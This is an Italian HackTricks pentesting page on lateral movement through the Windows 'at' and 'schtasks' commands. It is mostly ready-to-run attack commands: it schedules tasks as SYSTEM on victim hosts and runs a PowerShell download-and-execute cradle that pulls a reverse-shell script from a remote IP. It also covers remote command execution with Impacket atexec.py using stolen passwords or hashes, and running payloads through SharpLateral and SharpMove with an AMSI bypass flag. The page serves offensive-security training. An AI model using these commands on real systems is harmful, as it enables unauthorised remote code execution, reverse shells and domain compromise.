# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Come funziona

At consente di pianificare task sugli host per i quali conosci username/(password/Hash). Puoi quindi utilizzarlo per eseguire comandi su altri host e ottenere l'output.
```
At \\victim 11:00:00PM shutdown -r
```
Utilizzando schtasks, devi prima creare l'attività e poi eseguirla:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Puoi usare **`atexec.py` di Impacket** per eseguire comandi sui sistemi remoti usando il comando AT. Sono necessarie credenziali valide (nome utente e password oppure hash) per il sistema target.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Puoi anche usare [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Puoi usare [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Ulteriori informazioni sull'[**uso di schtasks con silver ticket qui**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
